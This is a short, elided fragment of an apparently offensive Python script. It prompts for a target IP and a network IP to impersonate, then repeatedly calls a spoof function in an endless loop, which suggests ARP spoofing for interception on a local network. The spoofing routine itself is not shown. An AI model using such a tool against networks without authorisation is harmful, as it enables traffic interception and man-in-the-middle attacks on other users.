...
# IP target
target = str(input(f'[{Cyan}?{White}] Enter {Red}" any IP "{White} in your network :'))
# IP spoof

spoofs = str(input(f'[{Cyan}?{White}] Enter {Red}" IP network "{White} :'))
...
try:
    while True:
        ...
        # spoof to target
        spoof(spoofs, target)
        print(f'{Cyan}[{Green}+{Cyan}]{White} Done send Packet ...')
        time.sleep(8)
